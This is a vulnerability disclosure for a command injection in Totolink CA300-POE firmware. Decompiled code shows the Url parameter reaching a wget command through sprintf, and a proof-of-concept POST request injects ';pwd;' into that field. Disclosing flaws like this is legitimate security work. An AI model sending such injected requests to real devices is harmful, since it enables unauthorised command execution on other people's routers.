## Totolink CA300-POE command injection

### Overview

* Vendor: TOTOLINK

* Product: Totolink CA300-POE
* Version: V6.2c.884_B20180522

* Manufacturer's address：https://www.totolink.net/
* Firmware download address ：https://totolink.id/data/upload/20181119/ba6d1ef945396a396fb70094a66d5e81.zip

### Vulnerability details

Totolink CA300-POE V6.2c.884_B20180522 was found to contain a command injection vulnerability in the `msg_process` function via the `Url` parameter. This vulnerability allows attackers to execute arbitrary commands via a crafted request.

```
 1 int __fastcall msg_process(int a1, int a2, int a3, int a4)
 2 {
 3 ……
 4 v7 = cJSON_Parse(a1);
 5 Var = (const char *)websGetVar(v7, "Action", "");
 6 v9 = (const char *)websGetVar(v7, "APMAC", "");
 7 ……
 8 if ( strcmp(Var, "Scan") )
 9 {
 10 ……
 11 v18 = 1;
 12 if ( !strcmp(DEVMAC, v9) )
 13 {
 14 v18 = 0;
 15 ……
 16 }
 17 if ( !v18 )
 18 {
 19 ……
 20 if ( !strcmp(Var, "RemoteUpgradeFW") )
 21 {
 22 v24 = (const char *)websGetVar(v7, "Port", "");
 23 v25 = (const char *)websGetVar(v7, "Url", "");     //Injection 
 24 seconds = websGetVar(v7, "magicid", "");
 25 v26 = (const char *)websGetVar(v7, "ProxyEnabled", "");
 26 if ( !strcmp(v26, "1") )
 27 {
 28 ……
 29 v64 = strrchr(v25, '/');
 30 v31 = inet_ntoa(*(struct in_addr *)(a4 + 4));
 31 ObjectItem = v56;
 32 sprintf(v56, "wget ‐O /tmp/fwdir/%s http://%s:%s%s", v64, v31, v24, v25);
 33 v23 = 0;
 34     if ( !CsteSystem(ObjectItem, 0) )    //Execution
 35 ……
 36 	}
 37   }
 38 }
```

#### PoC

```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.0.254
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: application/json, text/javascript, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 160
Origin: http://192.168.0.254
Connection: close
Referer: http://192.168.0.254
Cookie: SESSION_ID=2:1801026000:2

{
    "topicurl":"msg_process",
    "Action":"RemoteUpgradeFW",
    "ProxyEnabled": 1,
    "Url": "1;pwd;"
}
```

